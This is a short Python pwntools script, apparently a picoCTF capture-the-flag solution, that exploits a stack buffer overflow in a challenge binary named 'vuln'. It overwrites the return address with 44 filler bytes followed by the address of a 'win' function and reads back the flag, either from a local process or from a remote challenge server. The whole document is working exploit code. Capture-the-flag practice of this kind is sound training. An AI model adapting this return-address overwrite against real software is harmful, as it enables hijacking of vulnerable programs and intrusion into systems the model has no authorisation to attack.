#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 52578)

    return r


def main():
    r = conn()

    length = 44     # <--- cyclic -n 4 --lookup 0x6161616c
    win = exe.symbols['win']

    payload = b'A' * length + p64(win)
    r.sendlineafter(b'Please enter your string: \n', payload)
    
    flag = r.recvuntilS('}', drop = False)
    log.warn(f'Flag obtained: {flag}')


if __name__ == "__main__":
    main()
